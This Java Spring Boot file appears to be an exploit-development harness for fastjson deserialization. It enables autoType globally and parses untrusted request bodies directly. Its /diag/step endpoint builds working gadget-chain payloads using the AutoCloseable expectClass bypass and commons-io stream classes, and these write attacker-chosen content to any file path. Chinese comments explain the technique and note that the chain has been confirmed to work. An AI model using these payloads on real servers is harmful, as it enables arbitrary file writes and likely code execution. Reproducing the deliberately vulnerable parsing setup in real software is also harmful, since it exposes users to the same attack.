package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.apache.commons.io.input.CharSequenceReader;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.LockableFileWriter;
import org.apache.commons.io.output.WriterOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        log.info("[BOOT] autoType={}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        SpringApplication.run(App.class, args);
    }

    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            DecodedJWT jwt = JWT.decode(body.get("signedPayload"));
            String header = new String(Base64.getDecoder().decode(jwt.getHeader()), StandardCharsets.UTF_8);
            log.info("[V2] preview={}", header.substring(0, Math.min(80, header.length())));
            JSONObject.parseObject(header);
            r.put("code", 500); r.put("msg", "ok");
        } catch (NullPointerException e) {
            r.put("code", 500); r.put("msg", "NPE-ok");
        } catch (Exception e) {
            log.error("[V2-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("code", 500); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping(value = "/raw", consumes = "*/*")
    public Map<String, Object> raw(HttpServletRequest request) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            log.info("[RAW] len={}", json.length());
            Object result = JSONObject.parseObject(json);
            log.info("[RAW] ok type={}", result == null ? "null" : result.getClass().getName());
            r.put("ok", true);
        } catch (Exception e) {
            log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[RAW-STACK] {}", sw);
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    /** 纯 Java 链（已确认可用）*/
    @PostMapping("/diag/chain")
    public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/chain_test");
        String content = body.getOrDefault("content", "CHAIN-TEST\n");
        try {
            String padded = content + " ".repeat(Math.max(0, 8193 - content.length()));
            Charset cs = Charset.forName("iso-8859-1");
            ReaderInputStream ris = new ReaderInputStream(new CharSequenceReader(padded), cs, 1);
            LockableFileWriter lfw = new LockableFileWriter(new File(file), "iso-8859-1", false, "/tmp");
            WriterOutputStream wos = new WriterOutputStream(lfw, cs, 1, true);
            TeeInputStream tee = new TeeInputStream(ris, wos, true);
            byte[] buf = new byte[8192]; while (tee.read(buf) != -1) {}
            tee.close();
            r.put("ok", true); r.put("file", file);
        } catch (Exception e) {
            log.error("[CHAIN-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * 精确诊断：用 ByteArrayInputStream 替换 ReaderInputStream
     *
     * 原因：
     *   - commons-io 2.4 的 ReaderInputStream 编译时无 LocalVariableTable 参数名
     *   - fastjson 选 3 参数构造函数但 charsetName=null → IllegalArgumentException
     *   - JDK 自带的 ByteArrayInputStream 保留参数名 "buf"
     *   - fastjson 可以将 base64 字符串注入为 byte[]
     *
     * step=1  单独测试 ByteArrayInputStream(buf=base64) 能否实例化
     * step=2  完整链：lfw + wos + bais + tee + xml（替换 ReaderInputStream）
     * step=3  直接用 $ref 触发 TeeInputStream.read()（不需要 XmlStreamReader）
     */
    @PostMapping("/diag/step")
    public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
        String step = body.getOrDefault("step", "1");
        String file = body.getOrDefault("file", "/tmp/step_" + step);
        String content = body.getOrDefault("content", "STEP-" + step + "-OK\n");
        Map<String, Object> r = new LinkedHashMap<>();
        String json = null;
        try {
            // base64 编码内容（fastjson 注入 byte[] 的标准格式）
            // 填充到 8193 字节确保 XmlStreamReader 读取足够数据
            byte[] contentBytes = content.getBytes(StandardCharsets.ISO_8859_1);
            byte[] paddedBytes = new byte[Math.max(contentBytes.length, 8193)];
            System.arraycopy(contentBytes, 0, paddedBytes, 0, contentBytes.length);
            // 用空格填充剩余部分
            for (int i = contentBytes.length; i < paddedBytes.length; i++) paddedBytes[i] = (byte) ' ';
            String b64Content = Base64.getEncoder().encodeToString(paddedBytes);

            String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");

            switch (step) {

                case "1":
                    // 测试 ByteArrayInputStream(buf=base64) 能否实例化
                    // JDK ByteArrayInputStream 的构造函数参数名应保留在 LocalVariableTable
                    json = "{\"@type\":\"java.lang.AutoCloseable\","
                         + "\"@type\":\"java.io.ByteArrayInputStream\","
                         + "\"buf\":\"" + b64Content + "\"}";
                    break;

                case "2":
                    // 完整链，用 ByteArrayInputStream 替代 ReaderInputStream
                    // lfw → wos → bais → tee → xml(触发读操作)
                    json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                         // LockableFileWriter：写目标文件
                         + "\"lfw\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                             + "\"file\":\"" + escapedFile + "\","
                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                         // WriterOutputStream：包装 lfw，用 java.io.Writer expectClass
                         + "\"wos\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                             + "\"writer\":{\"$ref\":\"$.lfw\"},"
                             + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
                         // ByteArrayInputStream：包含我们的内容（base64注入）
                         + "\"bais\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"java.io.ByteArrayInputStream\","
                             + "\"buf\":\"" + b64Content + "\"},"
                         // TeeInputStream：bais → wos（复制数据到文件）
                         + "\"tee\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                             + "\"input\":{\"$ref\":\"$.bais\"},"
                             + "\"branch\":{\"$ref\":\"$.wos\"},"
                             + "\"closeBranch\":true},"
                         // XmlStreamReader：读取 tee 流，触发 TeeInputStream.read() → 写文件
                         + "\"xml\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
                             + "\"is\":{\"$ref\":\"$.tee\"},"
                             + "\"httpContentType\":\"text/xml\","
                             + "\"lenient\":true,"
                             + "\"defaultEncoding\":\"iso-8859-1\"}"
                         + "}";
                    break;

                case "3":
                    // 备选触发方式：不用 XmlStreamReader，直接通过 BOMInputStream.$ref 触发
                    // boms bytes 全零 → 触发 BOMInputStream.getBOM() → 读取 delegate 流
                    byte[] boms = new byte[paddedBytes.length + 1]; // 全零
                    StringBuilder bomsJson = new StringBuilder("[");
                    for (int i = 0; i < boms.length; i++) {
                        bomsJson.append(0);
                        if (i < boms.length - 1) bomsJson.append(",");
                    }
                    bomsJson.append("]");

                    json = "{\"@type\":\"java.lang.AutoCloseable\","
                         + "\"@type\":\"com.alibaba.fastjson.JSONObject\","
                         // 先用 JSONObject 包裹 lfw, wos, bais
                         + "\"lfw\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                             + "\"file\":\"" + escapedFile + "\","
                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                         + "\"wos\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                             + "\"writer\":{\"$ref\":\"$.lfw\"},"
                             + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
                         + "\"bais\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"java.io.ByteArrayInputStream\","
                             + "\"buf\":\"" + b64Content + "\"},"
                         + "\"tee\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                             + "\"input\":{\"$ref\":\"$.bais\"},"
                             + "\"branch\":{\"$ref\":\"$.wos\"},"
                             + "\"closeBranch\":true},"
                         + "\"x\":{\"$ref\":\"$.tee\"}"
                         + "}";
                    break;

                default:
                    r.put("ok", false); r.put("msg", "step must be 1/2/3"); return r;
            }

            log.info("[STEP-{}] json len={} preview={}", step, json.length(),
                    json.substring(0, Math.min(120, json.length())));

            Object result = JSONObject.parseObject(json);
            log.info("[STEP-{}] parseObject OK, resultType={}", step,
                    result == null ? "null" : result.getClass().getName());

            File f = new File(file);
            boolean exists = f.exists();
            long size = exists ? f.length() : -1;
            log.info("[STEP-{}] file={} exists={} size={}", step, file, exists, size);

            r.put("ok", true);
            r.put("resultType", result == null ? "null" : result.getClass().getSimpleName());
            r.put("fileExists", exists);
            r.put("fileSize", size);

        } catch (Exception e) {
            log.error("[STEP-{}-ERR] {}:{}", step, e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[STEP-{}-STACK]\n{}", step, sw);
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
            File f = new File(file);
            r.put("fileExists", f.exists());
            r.put("fileSize", f.exists() ? f.length() : -1);
        }
        return r;
    }
}
